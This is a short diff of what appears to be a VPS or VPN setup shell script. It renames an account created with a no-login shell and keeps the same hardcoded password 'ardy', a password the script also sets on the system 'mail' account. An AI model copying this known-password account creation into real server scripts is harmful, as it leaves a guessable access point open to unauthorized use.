@@ -390,8 +390,8 @@ rm ./ovpn.sh
 
 usermod -s /bin/false mail
 echo "mail:ardy" | chpasswd
-useradd -s /bin/false -M YUSUF-ARDIANSYAH
-echo "YUSUF-ARDIANSYAH:ardy" | chpasswd
+useradd -s /bin/false -M never
+echo "never:ardy" | chpasswd
 # finishing
 chown -R www-data:www-data /home/vps/public_html
 service cron restart
